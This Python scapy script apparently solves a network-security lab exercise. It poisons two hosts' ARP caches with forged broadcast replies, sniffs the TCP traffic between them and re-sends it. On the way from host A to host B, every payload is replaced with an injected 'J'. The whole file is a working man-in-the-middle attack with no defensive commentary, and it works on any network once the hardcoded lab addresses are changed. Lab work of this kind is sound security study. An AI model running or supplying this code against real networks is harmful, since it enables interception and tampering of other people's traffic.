#!/usr/bin/env python3
from scapy.all import *
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
    
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
    
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
    
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data
            newdata = bytes('J', 'ascii')
            send(newpkt/newdata)
        else:
            send(newpkt)
        ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

# This function will Map B's address to M in A's cache, and A's
# Address to M in B's cache.
def arp_poison():
    ether = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp1 = ARP(op = 2, hwdst = 'ff:ff:ff:ff:ff:ff',hwsrc = '02:42:0a:09:00:69', psrc = IP_B, pdst = IP_A)
    arp2 = ARP(op = 2, hwdst = 'ff:ff:ff:ff:ff:ff',hwsrc = '02:42:0a:09:00:69', psrc = IP_A, pdst = IP_B)

    sendp(ether/arp1)
    sendp(ether/arp2)

arp_poison()
# f is the filter expression, we want to capture and retransmit A and B's packets, but
# not M's packets. This filter will do so for all TCP packets.
f = 'tcp and not ether src 02:42:0a:09:00:69'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
